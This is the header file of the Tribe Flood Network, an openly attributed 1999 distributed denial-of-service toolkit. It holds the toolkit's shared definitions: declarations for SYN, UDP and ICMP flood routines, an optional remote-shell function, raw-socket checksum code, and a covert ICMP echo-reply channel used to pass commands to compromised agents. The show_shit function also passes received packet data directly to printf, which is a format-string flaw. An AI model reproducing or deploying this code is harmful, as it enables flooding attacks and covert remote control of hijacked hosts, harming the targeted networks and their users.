/* tubby.h - tribe flood network include file */

#ifndef TUBBY_H
#define TUBBY_H

#define DELIMITER "@"		/* to separate ips, e.g. host1@host2@host3 */

#define __FAVOR_BSD
#include <signal.h>
#include <stdio.h>
#include <netdb.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <signal.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/time.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <netinet/udp.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>

#ifdef ATTACKLOG
void 
dbug (char *s)
{
  int f = open (ATTACKLOG, O_WRONLY | O_APPEND | O_CREAT);
  write (f, s, strlen (s));
  close (f);
}
#endif

int psize = 0;			/* optional payload for packets */

char shameless_self_promotion[] = "\t\t[0;35m[tribe flood network]\t (c) 1999 by [5mMixter[0m\n\n";

#define getrandom(min, max) ((rand() % (int)(((max)+1) - (min))) + (min))
#define mixprintf(a,b,c) snprintf(a,sizeof(a)-1,b,c)
#define mixprintf2(a,b,c,d) snprintf(a,sizeof(a)-1,b,c,d)
#define ANSWER send_connect (ip->saddr, ID_ACK, answer)

struct timespec small =
{0, 1337};
#define WAITAMOMENT nanosleep(&small,NULL)

void send_connect (unsigned long, unsigned int, char *);
void send_raw (unsigned long, unsigned long, unsigned int, char *data);

void syn (u_long, u_short);
u_short cksum (u_short *, int);
void udp (u_long);
int validip (char *);
void icmp (u_long, u_long);
char *strfl (void);
void show_shit (char *);
inline u_long k00lip (void);
char *k00lntoa (void);
void must_kill_all (void);
void commence_udp (char *);
void commence_syn (char *, int);

#ifdef ID_SHELL
void shellsex (int);
#endif

unsigned short
ip_sum (addr, len)
     u_short *addr;
     int len;
{
  register int nleft = len;
  register u_short *w = addr;
  register int sum = 0;
  u_short answer = 0;

  while (nleft > 1)
    {
      sum += *w++;
      nleft -= 2;
    }
  if (nleft == 1)
    {
      *(u_char *) (&answer) = *(u_char *) w;
      sum += answer;
    }
  sum = (sum >> 16) + (sum & 0xffff);
  sum += (sum >> 16);
  answer = ~sum;
  return (answer);
}

u_short
cksum (u_short * buf, int nwords)
{

  unsigned long sum;

  for (sum = 0; nwords > 0; nwords--)
    sum += *buf++;
  sum = (sum >> 16) + (sum & 0xffff);
  sum += (sum >> 16);
  return ~sum;
}

int
validip (char *ip)
{
  int a, b, c, d, *x;
  sscanf (ip, "%d.%d.%d.%d", &a, &b, &c, &d);
  x = &a;
  if (*x < 0)
    return 0;
  if (*x > 255)
    return 0;
  x = &b;
  if (*x < 0)
    return 0;
  if (*x > 255)
    return 0;
  x = &c;
  if (*x < 0)
    return 0;
  if (*x > 255)
    return 0;
  x = &d;
  if (*x < 0)
    return 0;
  if (*x > 255)
    return 0;
  sprintf (ip, "%d.%d.%d.%d", a, b, c, d);	// truncate possible garbage data

  return 1;
}

void
send_connect (unsigned long to, unsigned int id, char *data)
{
  char buf[1024];
  struct icmphdr *icmp = (struct icmphdr *) buf;
  char *bla = (buf + sizeof (struct icmphdr));
  struct sockaddr_in sa;
  int i, ssock;

  ssock = socket (AF_INET, SOCK_RAW, 1);
  bzero (buf, 1024);
  icmp->type = 0;
  icmp->un.echo.id = htons (id);
  strncpy (bla, data, 900);
  icmp->checksum = cksum ((u_short *) icmp, (9 + strlen (data)) >> 1);
  sa.sin_family = AF_INET;
  sa.sin_port = 0;
  sa.sin_addr.s_addr = to;
  i = sendto (ssock, buf, (9 + strlen (data)), 0, (struct sockaddr *) &sa, sizeof (sa));
  close (ssock);
}

void
show_shit (char *buf)
{
  printf ((buf + sizeof (struct iphdr) + sizeof (struct icmphdr)));
}

#endif
